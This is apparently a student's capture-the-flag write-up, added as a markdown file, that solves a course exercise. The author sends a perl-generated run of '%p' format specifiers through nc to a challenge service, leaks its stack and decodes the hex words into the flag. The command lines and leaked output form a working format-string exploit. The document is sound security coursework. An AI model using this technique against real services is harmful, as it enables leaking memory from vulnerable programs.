@@ -1,0 +1,64 @@
+# Exercise 1
+## Jakob Udovic, s1049877
+
+connect to service:  
+`nc hackme.rded.nl 53133`
+
+```
+jakob@j-thinkpad-x1-carbon-2nd:~/Documents/git/HackingInC2020$ echo "$(perl -e 'print "%p "x95')" | nc hackme.rded.nl 53133
+0x8080808080808080 0x7fffffffebb7 0 0xfefefefefefefeff 0x7ffff7ffc645 0x4869434354467b57 0x30456b6f75526c52 0x346659586f705766 0x58696f774f667339 0x4f4d687968326746 0x704f6e724d6e494d 0x42514e694b515553 0x5331454c704d4953 0x61546b5a5030377d 0x1 0x7ffff7ffc645 0x7ffff7ffe360 0 0x48 0x7fffffffeb70 0xe0bec4c970082cdf 0x7fffffffec98 0x5555555552f1 0x7fffffffec30 0x5555555552da 0x1 0x120 0x7ffff7ffe360 0xe0bec4c970082cdf 0x7fffffffec40 0x5555555552ff 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec80 0 0xf8 0x7ffff7ffdd48 0x5555555550be 0x1 0x7fffffffee82 0 0x7fffffffee8f 0x7fffffffeed1 0x7fffffffeedc 0x7fffffffef08 0x7fffffffef1c 0x7fffffffef28 0x7fffffffef2e 0x7fffffffef41 0x7fffffffef48 0x7fffffffef55 0x7fffffffef63 0x7fffffffef79 0x7fffffffef88 0x7fffffffefa5 0x7fffffffefb9 0x7fffffffefd6 0 0x21 0x7ffff7f68000 0x10 0x1f8bfbff 0x6 0x1000 0x11 0x64 0x3 0x555555554040 0x4 0x38 0x5 0xa 0x7 0x7ffff7f69000 0x8 0 0x9 0x5555555550a8 0xb 0xfffe 0xc 0xfffe 0xd 0xfffe 0xe 0xfffe 0x17 0 0x19 0x7fffffffee69 0x1a 0 0x1f 0x7fffffffefeb
+```
+
+The stack I obtained by giving it a bunch of %p:  
+`$ echo "$(perl -e 'print "%p "x100')" | nc hackme.rded.nl 53133`
+
+```
+0x8080808080808080 0x7fffffffebb7 0 0xfefefefefefefeff 0x7ffff7ffc645 0x4869434354467b57 0x30456b6f75526c52 0x346659586f705766 0x58696f774f667339 0x4f4d687968326746 0x704f6e724d6e494d 0x42514e694b515553 0x5331454c704d4953 0x61546b5a5030377d 0x1 0x7ffff7ffc645 0x7ffff7ffe360 0 0x48 0x7fffffffeb70 0x998b3c4c409d24f6 0x7fffffffec98 0x5555555552f1 0x7fffffffec30 0x5555555552da 0x1 0x120 0x7ffff7ffe360 0x998b3c4c409d24f6 0x7fffffffec40 0x5555555552ff 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec80 0 0xf8 0x7ffff7ffdd48 0x5555555550be 0x1 0x7fffffffee81 0 0x7fffffffee8e 0x7fffffffeed0 0x7fffffffeedb 0x7fffffffef07 0x7fffffffef1b 0x7fffffffef27 0x7fffffffef2d 0x7fffffffef40 0x7fffffffef47 0x7fffffffef55 0x7fffffffef63 0x7fffffffef79 0x7fffffffef88 0x7fffffffefa5 0x7fffffffefb9 0x7fffffffefd6 0 0x21 0x7ffff7f68000 0x10 0x1f8bfbff 0x6 0x1000 0x11 0x64 0x3 0x555555554040 0x4 0x38 0x5 0xa 0x7 0x7ffff7f69000 0x8 0 0x9 0x5555555550a8 0xb 0xfffe 0xc 0xfffe 0xd 0xfffe 0xe 0xfffe 0x17 0 0x19 0x7fffffffee69 0x1a 0 0x1f 0x7fffffffefeb
+```
+
+After overthinking with addresses and their meaning I remembered the data can be stored in the stack too.  
+
+Therefore anything not starting on 0x7fff... was interesting to me to convert from hex to ascii.  
+I decided to trim the stack a bit, so I ignored the first 5 variables (registers) and focused on the rest.  
+Quickly, I figured that the string starts on the 6th place, because I was looking for a value 4343. That represents CC in hex:  
+
+```
+Dec, Hex, Chr
+67, 43, C
+72, 48, H
+```
+
+These were the addresses I focused on:
+```
+$ ./attack.sh 
+0x4869434354467b57
+0x30456b6f75526c52
+0x346659586f705766
+0x58696f774f667339
+0x4f4d687968326746
+0x704f6e724d6e494d
+0x42514e694b515553
+0x5331454c704d4953
+0x61546b5a5030377d
+```
+
+Then, I used a shell scrip that tried to run ./reverseaddr on every value, but then I quickly realized I do not need to do that.  
+I used online [hex-to-ascii converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
+
+By entering
+```
+4869434354467b57 
+30456b6f75526c52
+346659586f705766
+58696f774f667339
+4f4d687968326746
+704f6e724d6e494d
+42514e694b515553
+5331454c704d4953
+61546b5a5030377d
+```
+
+
+```
+HiCCTF{W0EkouRlR4fYXopWfXiowOfs9OMhyh2gFpOnrMnIMBQNiKQUSS1ELpMISaTkZP07}
+```
